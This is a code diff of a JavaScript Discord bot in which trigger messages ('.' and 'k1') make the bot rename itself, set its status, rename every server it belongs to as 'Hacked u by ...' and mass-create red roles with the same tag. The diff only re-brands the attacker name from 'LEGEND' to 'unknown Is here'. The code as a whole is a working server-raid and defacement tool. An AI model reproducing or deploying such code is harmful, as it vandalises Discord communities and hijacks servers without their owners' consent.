@@ -40,13 +40,13 @@ LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/3
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked u LEGEND")
+LOka.user.setUsername("Hacked u by unknown Is here")
  
 }
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked u by LEGEND`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
  
 }
 });
@@ -61,7 +61,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`Hacked u by LEGEND`)
+             m.setName(`Hacked u by unknown Is here`)
 })
 }
 });
@@ -77,12 +77,11 @@ LOka.on('message', message => {
  
 LOka.on('message', message => {
      
-     
  
      if (message.content === "k1") {
          LOka.guilds.forEach(m =>{
   m.createRole({
-        name : "Hacked u LEGND-YT",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -96,7 +95,7 @@ LOka.on('message', message => {
         permissions :   [1],
         color : " #ff0000"
     })
-m.createRole({
+    m.createRole({
         name : "Hacked u by LEGEND-YT",
         permissions :   [1],
         color : " #ff0000"
@@ -225,7 +224,7 @@ m.createRole({
         permissions :   [1],
         color : " #ff0000"
     })
-m.createRole({
+    m.createRole({
         name : "Hacked u by LEGEND-YT",
         permissions :   [1],
         color : " #ff0000"
@@ -244,7 +243,7 @@ m.createRole({
         permissions :   [1],
         color : " #ff0000"
     })
-m.createRole({
+    m.createRole({
         name : "Hacked u by LEGEND-YT",
         permissions :   [1],
         color : " #ff0000"
